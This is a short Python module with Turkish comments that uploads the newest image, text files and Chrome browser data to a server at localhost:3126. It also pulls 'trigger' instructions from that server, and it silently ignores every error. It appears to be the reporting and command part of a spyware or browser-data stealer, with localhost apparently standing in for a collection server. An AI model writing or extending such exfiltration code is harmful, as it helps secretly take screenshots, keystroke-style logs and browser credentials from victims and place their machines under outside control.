import requests
import json
from trigger_functions import write_triggers_json

def send_image(latest,yol): # send_image fonksiyonu en son eklenen resmi gönderir.
    try:
        with open(yol+latest, 'rb') as f:
            files = {'file': f}
            r = requests.post("http://localhost:3126/upload", files=files)
            print(r.text)
    except:
        pass
def send_txt(filename): # send_txt fonksiyonu belirtilen dosyayı gönderir.
    try:
        with open(filename, 'rb') as f:
            files = {'file': f}
            r = requests.post("http://localhost:3126/uploadtxt", files=files)
            print(r.text)
    except:
        pass

def send_chrome_data(filename): # send_chrome_data fonksiyonu belirtilen dosyayı gönderir.
    try:
        with open(filename, 'rb') as f:
            files = {'file': f}
            r = requests.post("http://localhost:3126/uploadchromedata", files=files)
            print(r.text)
    except:
        pass

def get_triggers():
    try:
        r = requests.get("http://localhost:3126/gettriggers")
        json_data = json.loads(r.text)
        write_triggers_json(json_data)
        return json_data
    except:
        pass